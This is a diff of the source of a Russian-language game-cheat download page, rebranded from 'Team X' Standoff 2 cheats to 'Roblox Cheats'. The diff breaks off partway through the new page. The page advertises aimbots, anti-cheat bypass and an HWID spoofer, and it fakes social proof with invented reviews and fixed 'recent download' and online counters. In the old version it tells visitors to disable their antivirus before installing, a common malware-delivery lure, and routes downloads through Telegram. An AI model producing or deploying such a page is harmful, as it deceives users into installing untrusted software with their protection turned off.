@@ -3,825 +3,388 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Team X - Читы для игр</title>
+    <title>Roblox Cheats - Скачать бесплатно</title>
     <style>
-        /* ===== ВЕСЬ СТАРЫЙ CSS (БЕЗ КНОПОК БЛЕВОТЫ) ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: 'Segoe UI', sans-serif; background: #0a0a12; color: #fff; min-height: 100vh; overflow-x: hidden; }
-        #stars-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }
-        .container { position: relative; z-index: 1; max-width: 1200px; margin: 0 auto; padding: 30px 20px; }
-
-        .header { text-align: center; padding: 30px 0 20px; animation: fadeDown 0.8s ease; }
-        @keyframes fadeDown { 0% { opacity: 0; transform: translateY(-30px); } 100% { opacity: 1; transform: translateY(0); } }
-        .logo { font-size: 70px; animation: pulse 2s infinite; }
-        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
-        h1 { font-size: 44px; font-weight: 900; background: linear-gradient(135deg, #00d4ff, #7b2ffc, #ff6b6b); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
-        .subtitle { font-size: 18px; color: #8888aa; margin-top: 5px; }
-        .online-badge { display: inline-block; background: #2ecc71; color: #fff; font-size: 12px; padding: 4px 16px; border-radius: 20px; margin-top: 8px; animation: blink 1.5s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
-
-        .counter-section { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin: 20px 0; animation: fadeUp 0.8s ease 0.2s both; }
-        @keyframes fadeUp { 0% { opacity: 0; transform: translateY(20px); } 100% { opacity: 1; transform: translateY(0); } }
-        .counter-box { text-align: center; padding: 18px; background: rgba(20, 20, 37, 0.85); backdrop-filter: blur(10px); border-radius: 15px; border: 1px solid rgba(30, 30, 58, 0.5); transition: 0.3s; }
-        .counter-box:hover { border-color: #00d4ff; transform: translateY(-2px); }
-        .counter-box .number { font-size: 36px; font-weight: 900; color: #00d4ff; }
-        .counter-box .label { font-size: 13px; color: #8888aa; margin-top: 3px; }
-        .counter-box .live { font-size: 10px; color: #2ecc71; }
-
-        .game-selector { display: grid; grid-template-columns: repeat(5, 1fr); gap: 15px; margin: 30px 0; animation: fadeUp 0.8s ease 0.4s both; }
-        .game-btn { padding: 18px 12px; border: 2px solid rgba(30, 30, 58, 0.6); border-radius: 15px; background: rgba(10, 10, 26, 0.7); backdrop-filter: blur(5px); color: #8888aa; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; text-align: center; }
-        .game-btn .icon { font-size: 36px; display: block; margin-bottom: 8px; }
-        .game-btn:hover { border-color: #00d4ff; color: #fff; transform: translateY(-3px); box-shadow: 0 0 30px rgba(0, 212, 255, 0.05); }
-        .game-btn.active { border-color: #00d4ff; background: rgba(0, 212, 255, 0.1); color: #00d4ff; box-shadow: 0 0 30px rgba(0, 212, 255, 0.1); }
-        .game-btn .badge { display: inline-block; font-size: 10px; padding: 2px 10px; border-radius: 12px; margin-top: 6px; }
-        .badge-green { background: #2ecc71; color: #fff; }
-        .badge-soon { background: #f39c12; color: #fff; }
-
-        .cheat-card { background: rgba(20, 20, 37, 0.85); backdrop-filter: blur(10px); border-radius: 20px; border: 1px solid rgba(30, 30, 58, 0.5); padding: 30px; margin: 20px 0; display: none; animation: fadeUp 0.5s ease; }
-        .cheat-card.active { display: block; }
-        .cheat-card .title { font-size: 30px; font-weight: 700; margin-bottom: 10px; }
-        .cheat-card .title span { color: #00d4ff; }
-        .cheat-card .desc { color: #8888aa; font-size: 16px; margin-bottom: 20px; }
-
-        .screenshots-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin: 20px 0; }
-        .screenshot-box { background: rgba(26, 26, 46, 0.7); border-radius: 12px; height: 150px; display: flex; flex-direction: column; align-items: center; justify-content: center; border: 1px solid rgba(30, 30, 58, 0.5); font-size: 40px; transition: 0.3s; cursor: default; }
-        .screenshot-box:hover { border-color: #00d4ff; transform: scale(1.03); box-shadow: 0 0 30px rgba(0, 212, 255, 0.05); }
-        .screenshot-box .label { font-size: 13px; color: #aaaacc; margin-top: 6px; }
-        .screenshot-box .sub { font-size: 10px; color: #555577; }
-
-        .features-list { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; }
-        .features-list li { list-style: none; padding: 12px 18px; background: rgba(10, 10, 26, 0.5); border-radius: 8px; color: #aaaacc; font-size: 15px; border-left: 2px solid #00d4ff; transition: 0.3s; }
-        .features-list li:hover { background: rgba(20, 20, 37, 0.7); border-left-color: #7b2ffc; }
-        .features-list li .check { color: #2ecc71; margin-right: 10px; }
-
-        .download-section { margin: 25px 0; padding: 25px; background: rgba(10, 10, 26, 0.5); border-radius: 15px; border: 1px solid rgba(30, 30, 58, 0.5); text-align: center; transition: 0.3s; }
-        .download-section:hover { border-color: #00d4ff; }
-        .btn-download { padding: 16px 60px; background: linear-gradient(135deg, #00d4ff, #7b2ffc); color: #fff; font-size: 20px; font-weight: 700; border: none; border-radius: 50px; cursor: pointer; transition: 0.3s; position: relative; overflow: hidden; }
-        .btn-download::before { content: ''; position: absolute; top: -2px; left: -2px; right: -2px; bottom: -2px; background: linear-gradient(135deg, #00d4ff, #7b2ffc, #00d4ff); background-size: 200% 200%; border-radius: 52px; z-index: -1; animation: borderGlow 3s ease infinite; }
-        @keyframes borderGlow { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
-        .btn-download:hover { transform: scale(1.05); box-shadow: 0 0 50px rgba(0, 212, 255, 0.3); }
-        .btn-download:active { transform: scale(0.95); }
-
-        .soon-card { text-align: center; padding: 50px 20px; color: #f39c12; }
-        .soon-card .big-icon { font-size: 70px; margin-bottom: 15px; animation: pulse 2s infinite; }
-        .soon-card .title { font-size: 26px; font-weight: 700; }
-        .soon-card .desc { color: #8888aa; font-size: 15px; margin-top: 8px; }
-
-        .reviews-section { margin: 30px 0; }
-        .reviews-section h3 { font-size: 22px; margin-bottom: 15px; }
-
-        .review-item { background: rgba(10, 10, 26, 0.5); padding: 15px 20px; border-radius: 10px; margin-bottom: 10px; border-left: 2px solid #00d4ff; transition: 0.3s; }
-        .review-item:hover { border-left-color: #7b2ffc; background: rgba(20, 20, 37, 0.5); }
-        .review-item .text { font-size: 15px; color: #ccccee; }
-        .review-item .author { font-size: 13px; color: #8888aa; margin-top: 5px; }
-        .review-item .stars { color: #ffd93d; font-size: 14px; }
-
-        .review-form { background: rgba(10, 10, 26, 0.5); padding: 20px; border-radius: 12px; border: 1px solid rgba(30, 30, 58, 0.5); margin: 15px 0; }
-        .review-form input, .review-form textarea { width: 100%; padding: 12px; margin-bottom: 10px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(30, 30, 58, 0.5); border-radius: 8px; color: #fff; font-size: 14px; outline: none; transition: 0.3s; }
-        .review-form input:focus, .review-form textarea:focus { border-color: #00d4ff; }
-        .review-form textarea { resize: vertical; min-height: 80px; }
-        .review-form .btn-submit { padding: 12px 40px; background: linear-gradient(135deg, #00d4ff, #7b2ffc); color: #fff; border: none; border-radius: 25px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; }
-        .review-form .btn-submit:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(0, 212, 255, 0.2); }
-        .rating-select { display: flex; gap: 10px; margin-bottom: 10px; }
-        .rating-select label { cursor: pointer; font-size: 24px; transition: 0.2s; }
-        .rating-select label:hover, .rating-select label.active { color: #ffd93d; transform: scale(1.2); }
-
-        .support-section { margin: 30px 0; }
-        .support-section h3 { font-size: 22px; margin-bottom: 15px; }
-        .support-box { background: rgba(10, 10, 26, 0.5); border-radius: 12px; border: 1px solid rgba(30, 30, 58, 0.5); padding: 20px; max-height: 300px; overflow-y: auto; }
-        .support-box .message { padding: 10px 15px; margin-bottom: 8px; border-radius: 10px; max-width: 80%; animation: slideIn 0.3s ease; }
-        .support-box .message.user { background: rgba(0, 212, 255, 0.15); border: 1px solid rgba(0, 212, 255, 0.3); margin-left: auto; text-align: right; }
-        .support-box .message.support { background: rgba(123, 47, 252, 0.15); border: 1px solid rgba(123, 47, 252, 0.3); margin-right: auto; }
-        .support-box .message .name { font-size: 12px; color: #8888aa; margin-bottom: 3px; }
-        .support-box .message .text { font-size: 14px; color: #ddd; }
-        .support-box .message .time { font-size: 10px; color: #555577; margin-top: 3px; }
-
-        .support-input { display: flex; gap: 10px; margin-top: 10px; }
-        .support-input input { flex: 1; padding: 12px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(30, 30, 58, 0.5); border-radius: 8px; color: #fff; font-size: 14px; outline: none; }
-        .support-input input:focus { border-color: #00d4ff; }
-        .support-input button { padding: 12px 30px; background: linear-gradient(135deg, #00d4ff, #7b2ffc); color: #fff; border: none; border-radius: 25px; font-size: 14px; font-weight: 700; cursor: pointer; transition: 0.3s; }
-
-        .recent-downloads { margin: 20px 0; padding: 20px; background: rgba(10, 10, 26, 0.5); border-radius: 12px; border: 1px solid rgba(30, 30, 58, 0.5); }
-        .recent-downloads h4 { font-size: 16px; color: #8888aa; margin-bottom: 10px; }
-        .recent-item { display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid rgba(26, 26, 46, 0.5); font-size: 13px; color: #aaaacc; animation: slideIn 0.5s ease; }
-        .recent-item:last-child { border-bottom: none; }
-        .recent-item .time { color: #555577; font-size: 11px; }
-
-        @keyframes slideIn { 0% { opacity: 0; transform: translateX(-10px); } 100% { opacity: 1; transform: translateX(0); } }
-
-        .toast { position: fixed; bottom: 20px; right: 20px; background: rgba(20, 20, 37, 0.9); backdrop-filter: blur(10px); border: 1px solid #00d4ff; padding: 12px 20px; border-radius: 10px; color: #fff; font-size: 14px; box-shadow: 0 0 30px rgba(0, 212, 255, 0.1); opacity: 0; transform: translateY(20px); transition: 0.5s; z-index: 999; }
-        .toast.show { opacity: 1; transform: translateY(0); }
-
-        .easter-egg { text-align: center; padding: 20px; margin: 20px 0; background: rgba(10, 10, 18, 0.5); border: 2px dashed rgba(51, 51, 85, 0.5); border-radius: 12px; cursor: pointer; transition: 0.3s; user-select: none; }
-        .easter-egg:hover { border-color: #ff6b6b; }
-        .easter-egg .hidden-text { display: none; font-size: 20px; color: #ff6b6b; margin-top: 10px; }
-        .easter-egg.active .hidden-text { display: block; }
-        .easter-egg .number { font-size: 36px; font-weight: 900; color: #333355; }
-        .easter-egg.active .number { color: #ff6b6b; animation: shake 0.3s infinite; }
-        @keyframes shake { 0%, 100% { transform: rotate(0deg); } 25% { transform: rotate(-10deg); } 75% { transform: rotate(10deg); } }
-
-        .warning { background: rgba(26, 10, 10, 0.7); border: 1px solid #ff4444; border-radius: 10px; padding: 15px; margin: 20px 0; color: #ff8888; text-align: center; font-size: 14px; }
-        .footer { text-align: center; color: #444466; font-size: 12px; padding: 20px 0; border-top: 1px solid rgba(20, 20, 37, 0.5); margin-top: 20px; }
-
-        .admin-btn-small {
-            background: none; border: none; color: #333355; font-size: 10px; cursor: pointer; text-decoration: underline; padding: 0; margin: 0; transition: 0.3s;
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0c;
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
         }
-        .admin-btn-small:hover { color: #00d4ff; }
-
-        .admin-modal-overlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); backdrop-filter: blur(5px); z-index: 1000; justify-content: center; align-items: center;
+        .container {
+            max-width: 1100px;
+            width: 100%;
+            background: #121218;
+            border-radius: 24px;
+            padding: 40px 30px;
+            border: 1px solid #2a2d3a;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
         }
-        .admin-modal-overlay.show { display: flex; }
-
-        .admin-modal-box {
-            background: rgba(20, 20, 37, 0.95); border: 1px solid #00d4ff; border-radius: 16px; padding: 30px; max-width: 350px; width: 90%; text-align: center; animation: fadeUp 0.3s ease;
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 40px;
+            flex-wrap: wrap;
+            gap: 20px;
         }
-        .admin-modal-box h3 { color: #00d4ff; margin-bottom: 15px; }
-        .admin-modal-box input {
-            width: 100%; padding: 12px; background: rgba(0, 0, 0, 0.3); border: 1px solid rgba(30, 30, 58, 0.5); border-radius: 8px; color: #fff; font-size: 16px; outline: none; margin-bottom: 10px; text-align: center;
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
         }
-        .admin-modal-box input:focus { border-color: #00d4ff; }
-        .admin-modal-box button {
-            padding: 10px 30px; background: linear-gradient(135deg, #00d4ff, #7b2ffc); color: #fff; border: none; border-radius: 25px; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s;
+        .logo-icon {
+            background: #e74c3c;
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            font-size: 22px;
+            color: white;
         }
-        .admin-modal-box button:hover { transform: scale(1.05); }
-        .admin-modal-box .error { color: #ff4444; font-size: 13px; margin-top: 8px; display: none; }
-        .admin-modal-box .close-btn { float: right; background: none; border: none; color: #ff4444; font-size: 22px; cursor: pointer; }
-
-        /* ===== БЛЕВОТНЫЙ РЕЖИМ (ТОЛЬКО СТИЛИ ДЛЯ САЙТА) ===== */
-        @keyframes vomitShake {
-            0% { transform: rotate(-2deg) scale(1.02); }
-            25% { transform: rotate(2deg) scale(0.98); }
-            50% { transform: rotate(-1deg) scale(1.01); }
-            75% { transform: rotate(1deg) scale(0.99); }
-            100% { transform: rotate(0deg) scale(1); }
+        .logo-text {
+            font-size: 26px;
+            font-weight: 800;
         }
-        @keyframes vomitColor {
-            0% { color: #ff0000; background-color: #00ff00 !important; }
-            25% { color: #00ff00; background-color: #0000ff !important; }
-            50% { color: #0000ff; background-color: #ffff00 !important; }
-            75% { color: #ffff00; background-color: #ff00ff !important; }
-            100% { color: #ff00ff; background-color: #ff0000 !important; }
+        .logo-text span { color: #e74c3c; }
+        .version-badge {
+            background: #1e212a;
+            padding: 6px 16px;
+            border-radius: 40px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #a0a0b0;
+            border: 1px solid #3a3d4a;
         }
-        @keyframes vomitOverlay {
-            0% { opacity: 0.3; transform: scale(1); }
-            50% { opacity: 0.7; transform: scale(1.05); }
-            100% { opacity: 0.3; transform: scale(1); }
+        .warning-banner {
+            background: linear-gradient(135deg, #1a1a2e, #2a1a2e);
+            border: 2px solid #e74c3c;
+            border-radius: 16px;
+            padding: 25px 30px;
+            margin-bottom: 40px;
+            text-align: center;
         }
-        @keyframes vomitText {
-            0% { transform: translate(-50%, -50%) rotate(-5deg) scale(1.1); color: #ff0000; }
-            50% { transform: translate(-50%, -50%) rotate(5deg) scale(0.9); color: #00ff00; }
-            100% { transform: translate(-50%, -50%) rotate(-5deg) scale(1.1); color: #ff00ff; }
+        .warning-banner h3 {
+            color: #e74c3c;
+            font-size: 20px;
+            margin-bottom: 8px;
         }
-
-        .vomit-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none; z-index: 99999;
-            background: repeating-linear-gradient(45deg, rgba(255,0,0,0.1), rgba(0,255,0,0.1) 20px, rgba(0,0,255,0.1) 40px, rgba(255,255,0,0.1) 60px);
-            animation: vomitOverlay 0.1s infinite;
+        .warning-banner p {
+            color: #aaa;
+            font-size: 16px;
         }
-        .vomit-text {
-            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            z-index: 99999; font-size: 48px; font-weight: 900; color: #ff0000;
-            text-shadow: 0 0 20px #ff0000, 0 0 40px #00ff00, 0 0 60px #0000ff;
-            animation: vomitText 0.1s infinite; pointer-events: none; text-align: center;
+        .warning-banner .btn-warp {
+            display: inline-block;
+            margin-top: 12px;
+            background: #e74c3c;
+            color: #fff;
+            padding: 12px 35px;
+            border-radius: 40px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 16px;
+            transition: 0.3s;
         }
-        body.vomit-active * {
-            animation: vomitShake 0.05s infinite !important;
-            transition: none !important;
+        .warning-banner .btn-warp:hover { background: #c0392b; }
+        .hero { text-align: center; margin: 20px 0 40px; }
+        .hero h1 {
+            font-size: 46px;
+            font-weight: 900;
+            line-height: 1.1;
+            margin-bottom: 15px;
         }
-        body.vomit-active .container {
-            transform: scale(1.02) rotate(-1deg) !important;
+        .hero h1 .highlight {
+            background: linear-gradient(135deg, #e74c3c, #f39c12);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
-
-        @media (max-width: 768px) {
-            .game-selector { grid-template-columns: 1fr 1fr; }
-            .counter-section { grid-template-columns: 1fr; }
-            .screenshots-grid { grid-template-columns: 1fr 1fr; }
-            .features-list { grid-template-columns: 1fr; }
-            h1 { font-size: 32px; }
+        .hero p {
+            font-size: 18px;
+            color: #9ca3af;
+            max-width: 600px;
+            margin: 0 auto 30px;
         }
-        @media (max-width: 480px) {
-            .game-selector { grid-template-columns: 1fr; }
-            .screenshots-grid { grid-template-columns: 1fr; }
-            .support-input { flex-direction: column; }
+        .hero .stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        .hero .stats .num {
+            font-size: 28px;
+            font-weight: 800;
+            color: #fff;
+        }
+        .hero .stats .label {
+            font-size: 13px;
+            color: #9ca3af;
+        }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 25px;
+            margin: 45px 0;
+        }
+        .feature-item {
+            background: #1a1a24;
+            padding: 24px 18px;
+            border-radius: 16px;
+            text-align: center;
+            border: 1px solid #2a2d3a;
+            transition: 0.3s;
+        }
+        .feature-item:hover { border-color: #e74c3c; }
+        .feature-item .icon { font-size: 34px; margin-bottom: 10px; display: block; }
+        .feature-item h4 { font-size: 17px; margin-bottom: 6px; }
+        .feature-item p { font-size: 14px; color: #9ca3af; }
+        .download-card {
+            background: #1a1a24;
+            border-radius: 20px;
+            padding: 40px 30px;
+            text-align: center;
+            border: 1px solid #2a2d3a;
+            margin: 30px 0 20px;
+        }
+        .download-card h2 { font-size: 28px; margin-bottom: 10px; }
+        .download-card .sub { color: #9ca3af; margin-bottom: 30px; }
+        .download-btn {
+            display: inline-block;
+            background: #e74c3c;
+            color: white;
+            font-weight: 800;
+            font-size: 20px;
+            padding: 18px 60px;
+            border-radius: 60px;
+            border: none;
+            cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 8px 30px rgba(231, 76, 60, 0.3);
+        }
+        .download-btn:hover {
+            background: #c0392b;
+            transform: scale(1.02);
+        }
+        #progress-area {
+            display: none;
+            margin-top: 25px;
+        }
+        .progress-bar-bg {
+            width: 100%;
+            height: 8px;
+            background: #2a2d3a;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #e74c3c, #f39c12);
+            border-radius: 10px;
+            transition: width 0.2s;
+        }
+        #progress-text {
+            margin-top: 12px;
+            font-weight: 500;
+            color: #c0c0d0;
+        }
+        .download-meta {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 25px;
+            color: #9ca3af;
+            font-size: 14px;
+            flex-wrap: wrap;
+        }
+        .download-meta span strong { color: #e0e0e0; font-weight: 600; }
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            color: #6b7280;
+            font-size: 13px;
+            border-top: 1px solid #2a2d3a;
+            padding-top: 30px;
+        }
+        .footer a { color: #e74c3c; text-decoration: none; }
+        @media (max-width: 600px) {
+            .container { padding: 20px 15px; }
+            .hero h1 { font-size: 32px; }
+            .download-btn { padding: 16px 40px; font-size: 17px; width: 100%; }
+            .header { flex-direction: column; align-items: start; }
+            .warning-banner { padding: 20px; }
         }
     </style>
 </head>
 <body>
 
-    <!-- ===== ФОН ===== -->
-    <canvas id="stars-canvas"></canvas>
+<div class="container">
 
-    <div class="container">
-
-        <!-- ===== HEADER ===== -->
-        <div class="header">
-            <div class="logo">🧠</div>
-            <h1>TEAM X CHEATS</h1>
-            <p class="subtitle">Лучший софт для игр · Новые обновления</p>
-            <span class="online-badge">🟢 127 онлайн</span>
+    <header class="header">
+        <div class="logo">
+            <div class="logo-icon">R</div>
+            <div class="logo-text"><span>Roblox</span>Cheats</div>
         </div>
-
-        <!-- ===== СЧЁТЧИКИ ===== -->
-        <div class="counter-section">
-            <div class="counter-box">
-                <div class="number" id="downloadCounter">100</div>
-                <div class="label">Всего скачиваний</div>
-                <div class="live">⬆ +2 за минуту</div>
-            </div>
-            <div class="counter-box">
-                <div class="number" id="onlineCounter">127</div>
-                <div class="label">Сейчас онлайн</div>
-                <div class="live" style="color:#2ecc71;">🟢 активно</div>
-            </div>
-            <div class="counter-box">
-                <div class="number">4.9⭐</div>
-                <div class="label">Средняя оценка</div>
-                <div class="live">🔥 256 отзывов</div>
-            </div>
+        <div class="nav-links">
+            <a href="#">Главная</a>
+            <a href="#">Читы</a>
+            <a href="#">Скрипты</a>
+            <a href="#">Поддержка</a>
         </div>
+        <div class="version-badge">🔴 v4.2.1</div>
+    </header>
 
-        <!-- ===== МЕНЮ ===== -->
-        <div class="game-selector">
-            <button class="game-btn active" data-game="standoff2">
-                <span class="icon">🔫</span>
-                Standoff 2
-                <span class="badge badge-green">Доступно</span>
-            </button>
-            <button class="game-btn" data-game="rust">
-                <span class="icon">🦀</span>
-                Rust (Пиратка)
-                <span class="badge badge-soon">Скоро</span>
-            </button>
-            <button class="game-btn" data-game="rust_orig">
-                <span class="icon">🦀</span>
-                Rust (Ориг)
-                <span class="badge badge-soon">Скоро</span>
-            </button>
-            <button class="game-btn" data-game="cs2">
-                <span class="icon">🎯</span>
-                CS 2
-                <span class="badge badge-soon">Скоро</span>
-            </button>
-            <button class="game-btn" data-game="spoofer">
-                <span class="icon">🛡️</span>
-                Спуфер
-                <span class="badge badge-soon">Скоро</span>
-            </button>
-        </div>
-
-        <!-- ===== STANDOFF 2 ===== -->
-        <div class="cheat-card active" id="standoff2">
-            <div class="title">🔫 Standoff 2 <span>Cheat v3.2</span></div>
-            <div class="desc">Новейший софт для профессиональной игры. Уже доступен!</div>
-
-            <div class="screenshots-grid">
-                <div class="screenshot-box">🎯 <div class="label">Aimbot</div><div class="sub">Прицел</div></div>
-                <div class="screenshot-box">👁️ <div class="label">ESP</div><div class="sub">Стены</div></div>
-                <div class="screenshot-box">🔫 <div class="label">No Recoil</div><div class="sub">Отдача</div></div>
-                <div class="screenshot-box">⚡ <div class="label">Speed Hack</div><div class="sub">Скорость</div></div>
-                <div class="screenshot-box">🔄 <div class="label">Bunny Hop</div><div class="sub">Прыжки</div></div>
-                <div class="screenshot-box">🛡️ <div class="label">Обход</div><div class="sub">Античит</div></div>
-            </div>
-
-            <ul class="features-list">
-                <li><span class="check">✅</span> Aimbot с настройкой FOV</li>
-                <li><span class="check">✅</span> ESP + здоровье + дистанция</li>
-                <li><span class="check">✅</span> No Recoil</li>
-                <li><span class="check">✅</span> Speed Hack до 200%</li>
-                <li><span class="check">✅</span> Bunny Hop + Trigger Bot</li>
-                <li><span class="check">✅</span> Обход античита</li>
-            </ul>
-
-            <div class="download-section">
-                <a href="https://t.me/STENDOFF_CHEAT456" target="_blank">
-                    <button class="btn-download">⬇️ СКАЧАТЬ ЧИТ</button>
-                </a>
-            </div>
-
-            <!-- ===== ОТЗЫВЫ ===== -->
-            <div class="reviews-section">
-                <h3>💬 Отзывы</h3>
-                <div id="reviewsList">
-                    <div class="review-item">
-                        <div class="stars">⭐⭐⭐⭐⭐</div>
-                        <div class="text">"Лучший чит для Standoff 2. Аимбот — просто бомба!"</div>
-                        <div class="author">Алексей · Киберспортсмен, топ-10 EU</div>
-                    </div>
-                    <div class="review-item">
-                        <div class="stars">⭐⭐⭐⭐⭐</div>
-                        <div class="text">"Пользуюсь 2 месяца, античит не палит. Рекомендую!"</div>
-                        <div class="author">Дмитрий · Команда CyberX</div>
-                    </div>
-                </div>
-
-                <div class="review-form">
-                    <h4 style="margin-bottom:10px; color:#aaaacc;">✍️ Оставить отзыв</h4>
-                    <input type="text" id="reviewName" placeholder="Ваше имя">
-                    <div class="rating-select" id="ratingSelect">
-                        <label data-rating="1">⭐</label>
-                        <label data-rating="2">⭐⭐</label>
-                        <label data-rating="3">⭐⭐⭐</label>
-                        <label data-rating="4">⭐⭐⭐⭐</label>
-                        <label data-rating="5" class="active">⭐⭐⭐⭐⭐</label>
-                    </div>
-                    <textarea id="reviewText" placeholder="Ваш отзыв..."></textarea>
-                    <button class="btn-submit" onclick="submitReview()">📤 Отправить отзыв</button>
-                </div>
-            </div>
-
-            <!-- ===== ПОДДЕРЖКА ===== -->
-            <div class="support-section">
-                <h3>🆘 Поддержка (чат)</h3>
-                <div class="support-box" id="supportBox">
-                    <div class="message support">
-                        <div class="name">🔹 Team X Support</div>
-                        <div class="text">Здравствуйте! Чем мы можем вам помочь?</div>
-                        <div class="time">только что</div>
-                    </div>
-                </div>
-                <div class="support-input">
-                    <input type="text" id="supportInput" placeholder="Напишите сообщение..." onkeypress="if(event.key==='Enter') sendSupportMessage()">
-                    <button onclick="sendSupportMessage()">📩 Отправить</button>
-                </div>
-            </div>
-
-            <div class="recent-downloads">
-                <h4>📥 Последние скачивания</h4>
-                <div class="recent-item"><span>🔫 Standoff 2 Cheat v3.2</span><span class="time">только что</span></div>
-                <div class="recent-item"><span>🔫 Standoff 2 Cheat v3.2</span><span class="time">2 минуты назад</span></div>
-                <div class="recent-item"><span>🔫 Standoff 2 Cheat v3.2</span><span class="time">5 минут назад</span></div>
-                <div class="recent-item"><span>🔫 Standoff 2 Cheat v3.2</span><span class="time">12 минут назад</span></div>
-            </div>
-
-            <div class="warning">
-                ⚠️ Отключи антивирус перед установкой!<br>
-                Поддержка: <a href="https://t.me/Byrmaldimvhamame" style="color:#ff6666;">@Byrmaldimvhamame</a>
-            </div>
-        </div>
-
-        <!-- ===== ОСТАЛЬНЫЕ ИГРЫ ===== -->
-        <div class="cheat-card" id="rust">
-            <div class="soon-card">
-                <div class="big-icon">🦀</div>
-                <div class="title">Rust (Пиратка) — Скоро</div>
-                <div class="desc">Чит для пиратской версии Rust. Разрабатывается.<br>Ожидайте в ближайшее время.</div>
-            </div>
-        </div>
-        <div class="cheat-card" id="rust_orig">
-            <div class="soon-card">
-                <div class="big-icon">🦀</div>
-                <div class="title">Rust (Ориг) — Скоро</div>
-                <div class="desc">Чит для оригинальной версии Rust. Разрабатывается.<br>Ожидайте в ближайшее время.</div>
-            </div>
-        </div>
-        <div class="cheat-card" id="cs2">
-            <div class="soon-card">
-                <div class="big-icon">🎯</div>
-                <div class="title">CS 2 — Скоро</div>
-                <div class="desc">Чит для Counter-Strike 2. Готовится к релизу.<br>Скоро будет доступно.</div>
-            </div>
-        </div>
-        <div class="cheat-card" id="spoofer">
-            <div class="soon-card">
-                <div class="big-icon">🛡️</div>
-                <div class="title">Спуфер — Скоро</div>
-                <div class="desc">Спуфер для замены HWID и обхода блокировок.<br>Разрабатывается. Ожидайте.</div>
-            </div>
-        </div>
-
-        <!-- ===== ПАСХАЛКА 67 ===== -->
-        <div class="easter-egg" id="easterEgg">
-            <div class="number">🔮 67</div>
-            <p style="color:#555577; font-size:12px;">Нажми на 67</p>
-            <div class="hidden-text">
-                🧠 ТЫ НАШЁЛ ПАСХАЛКУ!<br>
-                <span style="font-size:16px; color:#ffd93d;">🤡 67 — ЭТО МЕМ</span><br>
-                <span style="font-size:12px; color:#8888aa;">"67 — это не просто число, это стиль жизни"</span>
-            </div>
-        </div>
-
-        <!-- ===== ФУТЕР ===== -->
-        <div class="footer">
-            <p>© 2026 Team X · Все права защищены</p>
-            <p style="margin-top:5px; font-size:11px; color:#333355;">
-                <button class="admin-btn-small" onclick="openAdminModal()">🔐 админ</button>
-            </p>
-            <p style="margin-top:6px; font-size:9px; color:#222244; letter-spacing:0.3px;">
-                Автор не несёт ответственности за использование данного ПО.
-            </p>
-        </div>
-
+    <div class="warning-banner">
+        <span style="font-size:40px;display:block;margin-bottom:10px;">🌐</span>
+        <h3>⚠️ ТРЕБУЕТСЯ VPN ДЛЯ РАБОТЫ</h3>
+        <p>Для активации чита необходимо установить <strong>Cloudflare WARP</strong> или любой другой VPN.</p>
+        <a href="https://1.1.1.1/" target="_blank" class="btn-warp">⬇ СКАЧАТЬ WARP</a>
+        <p style="margin-top:10px;font-size:13px;color:#666;">После установки WARP нажмите "Проверить подключение"</p>
     </div>
 
-    <!-- ===== МОДАЛЬНОЕ ОКНО ДЛЯ ПАРОЛЯ ===== -->
-    <div class="admin-modal-overlay" id="adminModal">
-        <div class="admin-modal-box">
-            <button class="close-btn" onclick="closeAdminModal()">✕</button>
-            <h3>🔐 Введите пароль</h3>
-            <input type="password" id="adminPassInput" placeholder="Пароль..." onkeypress="if(event.key==='Enter') checkAdminPass()">
-            <button onclick="checkAdminPass()">Войти</button>
-            <div class="error" id="adminPassError">❌ Неверный пароль!</div>
+    <section class="hero">
+        <h1>Скачай <span class="highlight">читы для Roblox</span> бесплатно</h1>
+        <p>Лучшие читы 2026 года. Работают на всех версиях игры. Полная безопасность.</p>
+        <div class="stats">
+            <div><span class="num">4.8</span><div class="label">⭐ Рейтинг</div></div>
+            <div><span class="num">120K+</span><div class="label">📥 Скачиваний</div></div>
